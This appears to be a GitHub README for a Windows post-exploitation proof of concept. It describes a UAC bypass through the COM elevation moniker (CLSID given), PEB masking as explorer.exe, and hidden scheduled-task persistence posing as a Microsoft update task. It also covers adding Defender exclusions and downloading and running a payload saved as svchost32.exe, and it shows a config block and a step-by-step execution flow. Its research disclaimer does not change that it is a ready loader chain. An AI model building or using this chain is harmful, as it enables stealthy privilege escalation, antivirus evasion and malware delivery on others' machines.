# COM Elevation PoC

UAC bypass + persistence using COM elevation and PEB masking.

## What it does

Bypasses UAC using the COM elevation moniker trick, masks itself as explorer.exe in the PEB, sets up persistence via Task Scheduler, and can download/execute payloads. Everything's configurable so you can adapt it for different scenarios.

## Features

- COM elevation moniker abuse (ICMUACUtil interface)
- PEB masking to hide process info
- Task Scheduler persistence with SYSTEM privileges
- String encryption with skCrypter
- Config-based setup (no hardcoded bullshit)

## Setup

Just edit `GetConfig()` in poc.cpp:

```cpp
Config GetConfig() {
    Config cfg;
    cfg.taskName = skCrypt(L"WindowsUpdateTask");
    cfg.authorName = skCrypt(L"Microsoft Corporation");
    cfg.downloadUrl = skCrypt(L"https://example.com/payload.exe");
    cfg.targetPath = skCrypt(L"C:\\Windows\\System32\\svchost32.exe");
    cfg.exclusionPath = skCrypt(L"C:\\Windows\\System32\\");
    cfg.exclusionExtension = skCrypt(L"exe");
    cfg.downloadDelay = 12000;
    cfg.executionDelay = 1000;
    return cfg;
}
```

**Config options:**
- `taskName` - scheduled task name
- `authorName` - task author (blend in)
- `downloadUrl` - where to grab the payload
- `targetPath` - where to save it
- `exclusionPath` - defender exclusion path
- `exclusionExtension` - defender exclusion extension
- `downloadDelay` - wait time after download (ms)
- `executionDelay` - wait time after exclusions (ms)

## Compilation

```cmd
cl.exe /EHsc /O2 poc.cpp
```

Needs: ole32.lib, advapi32.lib, taskschd.lib, comsuppw.lib

## How it works

**UAC Bypass:**
Uses `Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}` to get elevated COM objects without prompting. Old trick but still works on some configs.

**PEB Masking:**
Rewrites ImagePathName, CommandLine, FullDllName, and BaseDllName in the PEB to point at explorer.exe. Makes the process look legit to basic checks.

**Persistence:**
Creates a scheduled task that runs on logon with highest privileges. Won't stop if you're on battery, can't be hard-terminated.

**String Obfuscation:**
All sensitive strings (API names, paths, commands, CLSIDs) are encrypted at compile-time with skCrypter and only decrypted when needed.

## Execution flow

1. Check if already elevated
2. If not, mask PEB and re-launch elevated via COM trick
3. Create persistence task
4. Add defender exclusions
5. Download payload
6. Execute payload

## Disclaimer

For research/red team only. Don't be an idiot and use this on systems you don't own or have permission to test. That's illegal.

## Detection

Modern EDR will probably catch this. AMSI might flag the PowerShell commands. Defender with cloud protection will likely detect it. This is a PoC, not FUD.

Test in VMs/isolated environments.

## Credits

- angelinfilth - https://github.com/angelinfilth/com-elevation-poc
- skCrypter for string obfuscation

## License

Do whatever you want with it. No warranty, use at your own risk.
